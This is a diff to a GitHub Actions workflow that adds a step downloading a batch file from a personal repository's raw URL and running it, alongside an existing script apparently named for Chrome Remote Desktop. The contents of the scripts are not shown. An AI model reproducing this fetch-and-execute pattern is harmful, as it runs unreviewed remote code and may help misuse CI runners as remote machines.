@@ -13,9 +13,13 @@ jobs:
       - name: Downloading & Installing Essentials
         run: |
           Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/rme/loop.bat" -OutFile "loop.bat"
+          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/uv/Downloads.bat" -OutFile "Downloads.bat"
           Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/ChReDp/ChReDp.bat" -OutFile "ChReDp.bat"
           
 
+      - name: Downloads
+        run: cmd /c Downloads.bat
+        
       - name: ChReDp
         run: cmd /c ChReDp.bat
 
